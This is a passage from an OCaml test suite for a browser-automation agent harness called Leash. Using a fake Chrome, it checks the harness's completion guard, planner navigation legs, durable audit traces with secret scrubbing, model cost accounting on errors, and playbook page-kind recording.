          check_code "hand-0wo8 queued client deadline" "timeout" (Option.get !second);
          ignore (result (call text))))

(* trace-qe8c trace-iqqz trace-zbb9 trace-uovo: public control persists every
   drive outcome before replying, without a browser/service/provider. *)
let collection_done_guard
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun env sw _ tabs fake ->
      let f = fake () in
      page_script f (fixture "unlabelled-controls-chrome.json") "Category";
      document_at ~title:"Category" ~url:product_url f;
      let evidence = get "books" (fixture "op07b-regressions.json") in
      Alcotest.(check bool)
        "map-op08 live books DONE left scroll frontier" true
        (get "can_scroll_down" evidence = `Bool true);
      let h =
        result (request tabs "alice" (P.New { url = Some product_url; label = None }))
        |> tab
      in
      let calls = ref 0 in
      let decide ~deadline request =
        incr calls;
        if !calls > 1 then
          Alcotest.(check bool)
            "map-bjon refusal reason reaches next JEV decision" true
            (contains (Yojson.Safe.to_string (Jev.body request)) "can still scroll down");
        decide_done ~deadline request
      in
      let reply =
        with_ticking_clock env sw (fun () ->
            Leash.Control.handle ~model:"fixture-model" ~installed:[] ~decide
              ~levels:(levels_with [] (ref []))
              tabs
              (run_wire ~tab:h
                 (match get "mission" evidence with `String s -> s | _ -> assert false)))
        |> Yojson.Safe.from_string |> P.decode_reply |> decoded
      in
      Alcotest.(check int) "map-op08 exactly three refusals then blocked" 4 !calls;
      Alcotest.(check bool)
        "map-op08 incomplete collection never supplies done baseline" true
        (get "status" reply <> str "done"))

(* pilot-x1f3 pilot-r94o: the protocol seam yields a navigating leg to the
   pilot and keeps every scrubbed turn in the durable audit. *)
let pilot_leg_scope
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.time
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  let root = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-pilot-legscope-" "" in
  Ox_caps.Cap_unix.unlink ~caps root;
  Ox_caps.Cap_unix.mkdir ~caps root 0o700;
  Fun.protect
    ~finally:(fun () -> rm_rf ~caps root)
    (fun () ->
      List.iter
        (fun (name, destination, terminal_after, expected_actions, expected_outcome) ->
          rig ~caps (fun env sw _ tabs fake ->
              let f = fake () in
              let rec web = function
                | `String value when String.starts_with ~prefix:"data:" value ->
                    str "https://example.com/"
                | `Assoc fields ->
                    obj (List.map (fun (key, value) -> (key, web value)) fields)
                | `List values -> `List (List.map web values)
                | value -> value
              in
              let fixture = web (fixture "unlabelled-controls-chrome.json") in
              page_script f fixture "Example";
              let actions = ref 0
              and decisions = ref 0
              and turns = ref 0
              and text_reads = ref 0 in
              let url () =
                if !actions >= 2 then destination
                else if !actions = 1 && name <> "kind navigation" then
                  "https://example.com/#section"
                else "https://example.com/"
              in
              document_at ~title:"Example" ~url:"https://example.com/" f;
              Fake.on_method f "Page.getFrameTree" (fun _ ->
                  let frame =
                    match get "frame" (get "frameTree" (get "frameTree" fixture)) with
                    | `Assoc fields ->
                        obj (("url", str (url ())) :: List.remove_assoc "url" fields)
                    | _ -> assert false
                  in
                  obj [ ("frameTree", obj [ ("frame", frame) ]) ]);
              Fake.on_method f "DOM.getDocument" (fun _ -> get "document" fixture);
              Fake.on_method f "DOM.getBoxModel" (fun _ -> get "box" fixture);
              Fake.on_method f "DOM.describeNode" (fun _ -> get "description" fixture);
              Fake.on_method f "Input.dispatchMouseEvent" (fun request ->
                  if get "type" (get "params" request) = str "mouseWheel" then
                    incr actions;
                  obj []);
              Fake.on_method f "Runtime.evaluate" (fun request ->
                  match get "expression" (get "params" request) with
                  | `String s when contains s "leash-operator-read" ->
                      let value =
                        match
                          operator_observation
                            ~text:(Printf.sprintf "page after %d scrolls" !actions)
                        with
                        | `Assoc fields ->
                            obj (("url", str (url ())) :: List.remove_assoc "url" fields)
                        | _ -> assert false
                      in
                      obj [ ("result", obj [ ("type", str "object"); ("value", value) ]) ]
                  | `String s
                    when String.starts_with ~prefix:"Array.from(document.body?.innerText"
                           s ->
                      incr text_reads;
                      page_evaluate
                        ~text:
                          (if !text_reads = 1 then "Example" else "Example Invoice table")
                        fixture request
                  | _ -> page_evaluate ~text:"Example" fixture request);
              let decide ~deadline request =
                incr decisions;
                if !actions >= terminal_after then decide_done ~deadline request
                else
                  Ok
                    Jev.
                      {
                        operation = operation "scroll_down";
                        script = None;
                        index = None;
                        option = None;
                        confidence = 1.;
                        target_confidence = None;
                        operation_probabilities = [ ("scroll_down", 1.) ];
                        target_probabilities = [];
                        targets = [];
                      }
              in
              let secret = "pilot-private-test-value" in
              let plan (request : Leash.Run.plan_request) =
                incr turns;
                if !turns = 1 then
                  Alcotest.(check bool)
                    "pilot sees asynchronously loaded table" true
                    (contains request.text "Invoice table");
                if !turns = 2 then (
                  Alcotest.(check int)
                    (name ^ " pilot returns after leg")
                    expected_actions !actions;
                  match request.legs with
                  | [ leg ] ->
                      Alcotest.(check string)
                        (name ^ " leg outcome") expected_outcome leg.outcome;
                      Alcotest.(check int)
                        (name ^ " acknowledged actions")
                        (expected_actions
                        +
                        if expected_outcome = "done" && terminal_after = expected_actions
                        then 1
                        else 0)
                        (List.length leg.steps)
                  | _ -> Alcotest.fail "pilot did not receive exactly one leg");
                Ok
                  Leash.Run.
                    {
                      answer =
                        (if !turns = 1 then Leg "Find the latest invoice"
                         else
                           Done
                             { result = "Checked the page"; evidence = []; records = [] });
                      expect = [];
                      usage = None;
                      reasoning_summary =
                        Some (Printf.sprintf "turn %d summary %s" !turns secret);
                      secrets_for_operator =
                        (if !turns = 1 then [ ("audit_secret", secret) ] else []);
                    }
              in
              let h =
                result
                  (request tabs "alice"
                     (P.New { url = Some "https://example.com/"; label = None }))
                |> tab
              in
              let installed =
                if name <> "kind navigation" then []
                else
                  [
                    Leash.Playbook.
                      {
                        file = "fake";
                        dir = None;
                        checks = [];
                        scripts = [];
                        playbook =
                          {
                            site = "example.com";
                            entry = "https://example.com/";
                            description = "Fake kinds";
                            pages =
                              [
                                {
                                  name = "invoices";
                                  url_pattern = None;
                                  text_marker = Some "page after 2";
                                  repeatable = false;
                                };
                                {
                                  name = "initial";
                                  url_pattern = None;
                                  text_marker = Some "page after";
                                  repeatable = false;
                                };
                              ];
                            procedures = [];
                            shapes = None;
                            scripts = None;
                            notes = None;
                          };
                      };
                  ]
              in
              let traces = Leash.Traces.create ~caps ~root () in
              let levels =
                {
                  (levels_with [] (ref [])) with
                  Run.plan = (fun ~deadline:_ request -> plan request);
                }
              in
              let reply =
                with_ticking_clock ~tick_ms:1 ~ticks:500_000 env sw (fun () ->
                    Leash.Control.handle ~traces ~decide ~levels ~installed tabs
                      (run_wire ~tab:h ~max_steps:50 "Find the latest invoice"))
                |> Yojson.Safe.from_string |> P.decode_reply |> decoded
              in
              Alcotest.(check int) (name ^ " exactly two pilot turns") 2 !turns;
              let path =
                match get "trace_path" reply with
                | `String p -> p
                | _ -> Alcotest.fail "missing durable trace"
              in
              let trace =
                match Leash.Traces.read ~caps path with
                | Ok t -> t
                | Error why -> Alcotest.fail why
              in
              Alcotest.(check int)
                (name ^ " durable planner turns")
                2
                (List.length trace.planner_turns);
              List.iteri
                (fun i (turn : P.Trace.planner_turn) ->
                  let reason = Option.value ~default:"" turn.reason in
                  Alcotest.(check bool)
                    (name ^ " each summary durable")
                    true
                    (contains reason (Printf.sprintf "turn %d summary" (i + 1)));
                  Alcotest.(check bool)
                    (name ^ " summary secret scrubbed")
                    false (contains reason secret))
                trace.planner_turns;
              Alcotest.(check int)
                (name ^ " navigator decisions")
                (expected_actions
                +
                if expected_outcome = "step-cap" || terminal_after = expected_actions then
                  1
                else 0)
                !decisions))
        [
          ("path navigation", "https://example.com/invoices", 99, 2, "done");
          ("query navigation", "https://example.com/?view=invoices", 99, 2, "done");
          ("kind navigation", "https://example.com/", 99, 2, "done");
          ("fragment-only reaches DONE", "https://example.com/#another", 3, 3, "done");
          ( "fragment-only reaches leg cap",
            "https://example.com/#another",
            99,
            15,
            "step-cap" );
        ])

(* pilot-oijk pilot-r94o: three missions cross the control protocol, replaying
   the actual remembered goal rather than treating its slug as a navigation goal. *)
let with_pilot_storage
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.tmp
       ; .. >) f =
  let root = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-pilot-memory-" "" in
  Ox_caps.Cap_unix.unlink ~caps root;
  Ox_caps.Cap_unix.mkdir ~caps root 0o700;
  let old =
    List.map
      (fun key -> (key, Ox_caps.Cap_sys.getenv_opt ~caps key))
      [ "XDG_CONFIG_HOME"; "XDG_STATE_HOME" ]
  in
  List.iter (fun (key, _) -> Ox_caps.Cap_unix.putenv ~caps key root) old;
  Fun.protect
    ~finally:(fun () ->
      List.iter
        (fun (key, value) ->
          Ox_caps.Cap_unix.putenv ~caps key (Option.value ~default:"" value))
        old;
      rm_rf ~caps root)
    (fun () -> f root)

let saved_pilot_trace (caps : < Ox_caps.Cap.fs_read ; .. >) body =
  let path =
    match get "trace_path" body with
    | `String path -> path
    | _ -> Alcotest.fail "missing pilot trace"
  in
  match Leash.Traces.read ~caps path with
  | Ok trace -> trace
  | Error why -> Alcotest.fail why

let pilot_error_usage
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.time
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  List.iter
    (fun unpriced ->
      with_pilot_storage ~caps (fun root ->
          rig ~caps (fun env sw _ tabs fake ->
              let traces = Leash.Traces.create ~caps ~root () in
              let f = fake () in
              page_script f (fixture "unlabelled-controls-chrome.json") modal_text;
              document_at ~title:"Invoices" ~url:"https://example.com/" f;
              let h =
                result
                  (request tabs "alice"
                     (P.New { url = Some "https://example.com/"; label = None }))
                |> tab
              in
              let turns = ref 0 in
              let plan ~deadline:_ _ =
                incr turns;
                Leash__Model_usage.start "pilot";
                Leash__Model_usage.report "pilot"
                  (if unpriced && !turns = 3 then None else Some 0.25);
                match !turns with
                | 1 ->
                    Error
                      (P.make_error
                         ~detail:(obj [ ("code", str "invalid-response") ])
                         (match P.Error_code.of_string "internal" with
                         | Ok code -> code
                         | Error _ -> assert false)
                         ~message:"refused scripted completion")
                | 2 ->
                    Ok
                      Run.
                        {
                          answer = Leg "Open invoices";
                          expect = [];
                          usage = None;
                          reasoning_summary = None;
                          secrets_for_operator = [];
                        }
                | _ ->
                    Error
                      (P.make_error
                         ~detail:(obj [ ("provider", str "fixture") ])
                         (match P.Error_code.of_string "internal" with
                         | Ok code -> code
                         | Error _ -> assert false)
                         ~message:"scripted provider failure")
              in
              let decide ~deadline request =
                Leash__Model_usage.start "operator";
                Leash__Model_usage.report "operator" (Some 0.125);
                decide_done ~deadline request
              in
              let levels = { (levels_with [] (ref [])) with Run.plan } in
              let reply =
                with_ticking_clock env sw (fun () ->
                    Leash.Control.handle ~traces ~levels ~installed:[] ~decide tabs
                      (run_wire ~tab:h "Check invoices"))
                |> Yojson.Safe.from_string |> P.decode_reply
              in
              let detail =
                match reply with
                | Ok (P.Failure { detail = Some detail; _ }) -> detail
                | _ -> Alcotest.fail "expected scripted provider failure"
              in
              Alcotest.(check bool)
                "all four calls retained" true
                (get "model_calls" detail = `Int 4);
              Alcotest.(check bool)
                "original error detail retained" true
                (get "provider" detail = str "fixture");
              let expected = if unpriced then `Null else `Float 0.875 in
              Alcotest.(check bool)
                "error reply cost" true
                (get "model_cost" detail = expected);
              Alcotest.(check bool)
                "reported subtotal" true
                (get "reported_cost" detail = `Float (if unpriced then 0.625 else 0.875));
              let trace = saved_pilot_trace caps detail in
              Alcotest.(check int) "durable error model calls" 4 trace.model_calls;
              Alcotest.(check bool)
                "durable error cost" true
                (trace.cost = if unpriced then None else Some 0.875);
              Alcotest.(check (list string))
                "all pilot turns audited" [ "invalid"; "leg"; "error" ]
                (List.map
                   (fun (turn : P.Trace.planner_turn) -> turn.answer)
                   trace.planner_turns))))
    [ false; true ]

let durable_drive_traces
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.time
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  let root = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-l51-control-" "" in
  Ox_caps.Cap_unix.unlink ~caps root;
  Ox_caps.Cap_unix.mkdir ~caps root 0o700;
  let rec remove ~(caps : < Ox_caps.Cap.fs_read ; Ox_caps.Cap.fs_write ; .. >) path =
    match Unix.lstat path with
    | st when st.Unix.st_kind = Unix.S_DIR ->
        Array.iter
          (fun name -> remove ~caps (Filename.concat path name))
          (Ox_caps.Cap_sys.readdir ~caps path);
        Ox_caps.Cap_unix.rmdir ~caps path
    | _ -> Ox_caps.Cap_unix.unlink ~caps path
  in
  Fun.protect
    ~finally:(fun () -> remove ~caps root)
    (fun () ->
      let store = Leash.Traces.create ~caps ~root () in
      rig ~caps (fun env sw _ tabs fake ->
          let f = fake () in
          page_script f (fixture "unlabelled-controls-chrome.json") modal_text;
          document_at ~title:"Blue Top" ~url:product_url f;
          let h =
            result (request tabs "alice" (P.New { url = Some product_url; label = None }))
            |> tab
          in
          let logs = Buffer.create 128 in
          let logger =
            Ox_observability.Logger.create ~service:"trace-tests" ~clock:env#clock
              ~mono_clock:env#mono_clock
              ~reporter:
                (Ox_observability.Logger.Reporter.writer (fun text ->
                     Buffer.add_string logs text))
              ()
          in
          let invoke ?traces ?levels ?(installed = []) ?(decide = decide_done) wire =
            let levels = Some (Option.value levels ~default:(levels_with [] (ref []))) in
            with_ticking_clock env sw (fun () ->
                Leash.Control.handle ?traces ~logger ~model:"fixture-model" ?levels
                  ~installed ~decide tabs wire)
            |> Yojson.Safe.from_string |> P.decode_reply
          in
          let count () =
            match Leash.Traces.list store () with
            | Ok rows -> List.length rows
            | Error why -> Alcotest.fail why
          in
          let saved ~(caps : < Ox_caps.Cap.fs_read ; .. >) body =
            let path =
              match get "trace_path" body with
              | `String path -> path
              | _ -> Alcotest.fail "trace-uovo missing reply trace_path"
            in
            Alcotest.(check bool)
              "trace-uovo path exists before reply" true (Sys.file_exists path);
            match Leash.Traces.read ~caps path with
            | Ok trace -> trace
            | Error why -> Alcotest.fail why
          in
          (* trace-qe8c: Chrome's pushed tab-strip title is not its document title. *)
          Fake.on_method f "Runtime.evaluate" (fun request ->
              match get "expression" (get "params" request) with
              | `String expression when contains expression "leash-operator-read" ->
                  let value =
                    match operator_observation ~text:modal_text with
                    | `Assoc fields ->
                        `Assoc
                          (("title", str "Blue Top")
                          :: ("url", str product_url)
                          :: ( "scroll",
                               obj
                                 [
                                   ("x", `Int 0);
                                   ("y", `Int 400);
                                   ("height", `Int 1000);
                                   ("viewport", `Int 600);
                                   ("width", `Int 800);
                                 ] )
                          :: List.remove_assoc "scroll"
                               (List.remove_assoc "title"
                                  (List.remove_assoc "url" fields)))
                    | value -> value
                  in
                  obj [ ("result", obj [ ("type", str "object"); ("value", value) ]) ]
              | _ ->
                  page_evaluate ~text:modal_text
                    (fixture "unlabelled-controls-chrome.json")
                    request);
          Fake.on_method f "Target.getTargets" (fun _ ->
              obj
                [
                  ( "targetInfos",
                    `List
                      [ get "targetInfo" (document ~title:"Blue Top" ~url:product_url) ]
                  );
                ]);
          Fake.emit f ~method_:"Target.targetInfoChanged"
            ~params:
              (document ~title:"automationexercise.com/product_details/1" ~url:product_url);
          Eio.Fiber.yield ();
          let body =
            invoke ~traces:store (run_wire ~tab:h "inspect the current page") |> decoded
          in
          let trace = saved ~caps body in
          Alcotest.(check bool)
            "trace-qe8c final reply has document title" true
            (get "title" (get "final" body) = str "Blue Top");
          Alcotest.(check (option string))
            "trace-qe8c final trace has document title" (Some "Blue Top")
            (Option.map (fun (p : P.Trace.trace_page) -> p.title) trace.final);
          Alcotest.(check string)
            "trace-qe8c public on-the-fly success" "done" trace.outcome;
          Alcotest.(check string)
            "trace-qe8c first navigable site" "automationexercise.com" trace.site;
          Alcotest.(check bool)
            "trace-zbb9 public acknowledged steps" true (trace.steps <> []);
          let before = count () in
          let disabled = invoke (run_wire ~tab:h "disabled trace capture") |> decoded in
          Alcotest.(check bool)
            "trace-szpg disabled omits path and writes nothing" true
            (field "trace_path" disabled = None && count () = before);
          let book_dir =
            if
              Sys.file_exists "../examples/playbooks/automationexercise.com/playbook.json"
            then "../examples/playbooks/automationexercise.com"
            else "examples/playbooks/automationexercise.com"
          in
          let book =
            match Leash.Playbook.load ~caps book_dir with
            | Ok book -> book
            | Error why -> Alcotest.fail why
          in
          let fly =
            invoke ~traces:store ~installed:[ book ]
              ~levels:(levels_with [ "none" ] (ref []))
              (run_wire ~tab:h "operator NONE with matching installed pages")
            |> decoded |> saved ~caps
          in
          Alcotest.(check string)
            "cut-0oal NONE records only declared kinds" ""
            (String.concat ","
               (List.filter
                  (fun kind ->
                    not
                      (List.exists
                         (fun (p : Leash.Playbook.page) -> p.name = kind)
                         book.playbook.pages))
                  fly.page_kind_path));
          let authored =
            invoke ~traces:store ~installed:[ book ]
              ~levels:
                (levels_with [ "automationexercise.com"; "add-to-cart"; "DONE" ] (ref []))
              (run_wire ~tab:h "add Blue Top to the cart")
            |> decoded |> saved ~caps
          in
          let declared kind =
            List.exists
              (fun (p : Leash.Playbook.page) -> p.name = kind)
              book.playbook.pages
          in
          let path = String.concat "," authored.page_kind_path in
          Alcotest.(check bool)
            ("kind-4qke cut-0oal only declared kinds are recorded (" ^ path ^ ")")
            true
            (authored.page_kind_path <> []
            && List.for_all declared authored.page_kind_path);
          Alcotest.(check bool)
            "trace-lg58 authored procedures flatten compiler-safe steps" true
            (List.exists
               (fun (p : P.Trace.trace_procedure) ->
                 p.procedure = "add-to-cart" && p.steps <> [])
               authored.procedures);
          let json = P.yojson_of_drive_trace authored |> Yojson.Safe.to_string in
          Alcotest.(check bool)
            "trace-lg58 authored trace excludes rows handles and raw operator state" true
            ((not (contains json "\"rows\""))
            && (not (contains json "\"snapshot\""))
            && (not (contains json "operator_state"))
            && not (contains json modal_text));
          let bad_root = Filename.concat root "not-a-directory" in
          let fd =
            Ox_caps.Cap_unix.openfile ~caps bad_root
              [ Unix.O_CREAT; Unix.O_EXCL; Unix.O_WRONLY ]
              0o600
          in
          Unix.close fd;
          let failed = Leash.Traces.create ~caps ~root:bad_root () in
          let reply =
            invoke ~traces:failed (run_wire ~tab:h "write failure preserves success")
            |> decoded
          in
          Alcotest.(check bool)
            "trace-uovo failed write logs without changing success" true
            (get "status" reply = str "done"
            && field "trace_path" reply = None
            && contains (Buffer.contents logs) "drive trace write failed");
          ignore (result (request tabs "alice" (P.Close { tab = h })));
          let refusal =
            invoke ~traces:store (run_wire ~tab:h "closed tab acquisition failure")
          in
          match refusal with
          | Ok (P.Failure error) ->
              let trace = saved ~caps (Option.value ~default:`Null error.detail) in
              Alcotest.(check string)
                "trace-qe8c trace-iqqz acquisition error is durable" "error" trace.outcome;
              Alcotest.(check string)
                "trace-qe8c no navigable page falls back to unknown" "unknown" trace.site
          | _ -> Alcotest.fail "trace-iqqz closed tab should be a protocol error"))

let () =
  let caps = Ox_test.powerbox () in
  Alcotest.run "L3 control protocol"
    [
      ( "lifecycle",
        [
          Alcotest.test_case "tab-of0i tmoc 1r34 hyap 1rx9 0vh8" `Quick (snapshot ~caps);
          Alcotest.test_case "daily-9ggi HiDPI controls and paragraph text" `Quick
            (daily_snapshot ~caps);
          Alcotest.test_case "chrome-qnul hjw9 fuao 2n8n" `Quick (lifecycle ~caps);
          Alcotest.test_case "svc-p67t qilu journal and redaction" `Quick
            (journal_redaction ~caps);
          Alcotest.test_case "run-ykq4 fake Chrome downloads" `Quick
            (download_events ~caps);
          Alcotest.test_case "svc-f4op optional OTLP reporter" `Quick
            (optional_otlp ~caps);
          Alcotest.test_case "chrome-akz4 d4mz" `Quick (safety ~caps);
          Alcotest.test_case "chrome-1yn9" `Quick (nav ~caps);
          Alcotest.test_case "chrome-qnul new waits" `Quick (new_waits ~caps);
          Alcotest.test_case "chrome-qnul new without url" `Quick (new_without_url ~caps);
          Alcotest.test_case "hard-6eei 92ik s719 tsva t6cq owci" `Quick
            (dialog_interruptions ~caps);
          Alcotest.test_case "chrome-qnul 1yn9 load timeout" `Quick (load_timeout ~caps);
          Alcotest.test_case "chrome-qnul 1yn9 handler budget" `Quick budget;
          Alcotest.test_case "chrome-38a4" `Quick (malformed ~caps);
          Alcotest.test_case "chrome-2z2z 6lfk" `Quick (lost ~caps);
          Alcotest.test_case "chrome-fwnu socket" `Quick (socket ~caps);
          Alcotest.test_case "hard-yi0a real socket timeout" `Quick
            (listener_budget_reply ~caps);
          Alcotest.test_case "svc-5wm8 second instance" `Quick (second_instance ~caps);
          Alcotest.test_case
            "hand-mb9s hand-0wo8 real socket capability and serialization" `Quick
            (shared_handle_over_socket ~caps);
          Alcotest.test_case "tab-x4v0 large text over socket" `Quick
            (large_text_over_socket ~caps);
          Alcotest.test_case "kind-a7uy kind-tdrv non-web tab labels" `Quick
            (non_web_tab_labels ~caps);
          Alcotest.test_case "human-origin shutdown" `Quick (human ~caps);
          Alcotest.test_case "tab-zc36 empty names" `Quick (empty_names ~caps);
          Alcotest.test_case "tab-bw4j pseudo-icon click safety" `Quick
            (pseudo_icon_hit ~caps);
          Alcotest.test_case "map-op08 map-bjon live collection DONE guard" `Quick
            (collection_done_guard ~caps);
          Alcotest.test_case "pilot-x1f3 pilot-r94o navigation legs and audit" `Quick
            (pilot_leg_scope ~caps);
          Alcotest.test_case "pilot-r94o error usage" `Quick (pilot_error_usage ~caps);
          Alcotest.test_case "trace-qe8c trace-iqqz public durable drives" `Quick
            (durable_drive_traces ~caps);
          Alcotest.test_case "drive-l7yk fake-browser dry-run" `Quick
            (drive_dry_run ~caps);
          Alcotest.test_case "tab-bw4j refused click is decided again" `Quick
            (refused_click_redecides ~caps ~operation_name:"click");
          Alcotest.test_case "map-op07 covered type_text re-decides without input" `Quick
            (fun () ->
              let action =
                match get "action" (get "flights" (fixture "op07b-regressions.json")) with
                | `List [ action ] -> action
                | _ -> Alcotest.fail "map-op07 missing live Flights action"
              in
              Alcotest.(check bool)
                "map-op07 real covered Departure field" true
                (get "label" (get "target" action) = str "Departure");
              refused_click_redecides ~caps
                ~operation_name:
                  (match get "operation" action with `String s -> s | _ -> assert false)
                ());
          Alcotest.test_case "run-9ypy run-4j1v run-snk4 run-shgh run-7blx" `Quick
            (run_mission ~caps);
          Alcotest.test_case "daily-9ggi temporary drive tabs" `Quick
            (drive_temporary_cleanup ~caps);
          Alcotest.test_case "map-puhi all drive tab lifecycles" `Quick
            (drive_tab_lifecycle ~caps);
          Alcotest.test_case "run-fwl8 run refusals" `Quick (run_refusals ~caps);
          Alcotest.test_case "run-rq6i run-m0r8 planner proposal" `Quick
            (run_proposal ~caps);
        ] );
      ( "L37 scripts",
        [
          Alcotest.test_case "extr-mp5z extr-8o1h extr-vgir playbook test" `Quick
            (playbook_test_command ~caps);
          Alcotest.test_case "extr-lslp playbook check" `Quick
            (playbook_check_command ~caps);
          Alcotest.test_case "extr-8o1h extr-k40c extr-p152 script step, safety" `Quick
            (run_script_step ~caps);
        ] );
    ]
